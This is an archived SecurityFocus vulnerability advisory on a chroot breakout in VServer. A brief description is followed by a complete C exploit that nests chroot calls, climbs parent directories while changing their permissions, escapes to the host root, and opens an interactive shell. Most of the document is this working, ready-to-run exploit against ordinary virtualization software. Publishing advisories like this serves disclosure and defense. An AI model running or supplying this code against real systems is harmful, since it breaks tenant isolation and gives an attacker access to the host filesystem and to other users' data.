source: http://www.securityfocus.com/bid/9596/info

VServer is reported prone to a breakout vulnerability that allows a malicious user to escape from the context of the chrooted root directory of the virtual server. This issue is due to the VServer application failing to secure itself against a "chroot-again" style vulnerability. Successful exploitation of this issue may allow an attacker to gain access to the filesystem outside of the chrooted root directory.

/* vserver@deadbeef.de modified the chroot-again exploit */
/* to work on vservers with "chmod 000 /vservers" */

/* Run this code in a vserver as root */
/* Tested with 2.4.24 and vserver 1.24 */

#include <sys/types.h>
#include <sys/stat.h>

main()
{
int i;

if (chdir("/") != 0) {
  perror("cd /"); exit(1);
}
if (mkdir("baz", 0777) != 0) {
  perror("mkdir baz");
}
if (chroot("baz") != 0) {
  perror("chroot baz"); exit(1);
}

for (i=0; i<50; i++) {
   if (chdir("..") != 0) {
      perror("cd .."); /* exit(1); */
   }
   if (chmod("..", S_IXOTH) != 0) {
      perror("chmod"); /* exit(1); */
   }
}
if (chroot(".") != 0) {
  perror("chroot ."); exit(1);
}
printf("Exploit seems to work. =)\n");
execl("/bin/sh", "sh", "-i", (char *)0);
perror("exec sh");
exit(0);
}
